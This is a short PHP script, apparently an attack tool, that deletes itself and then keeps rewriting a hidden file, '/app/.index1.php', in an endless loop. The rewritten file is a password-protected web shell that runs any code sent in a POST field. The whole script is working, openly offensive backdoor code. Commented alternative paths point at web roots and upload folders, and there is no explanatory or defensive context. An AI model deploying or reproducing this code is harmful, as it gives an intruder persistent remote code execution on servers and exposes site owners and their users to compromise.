<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
//$file = './.index.php';
$file = '/app/.index1.php';
//$file = '/var/www/html/uploads/.index.php';
$code = '<?php if(md5($_POST["pass"])=="7d28f09eb3fa88a43998f61d5dd25a1d"){@eval($_POST[a]);} ?>';
echo "success!";
while (1){
	file_put_contents($file,$code);
	usleep(0);
}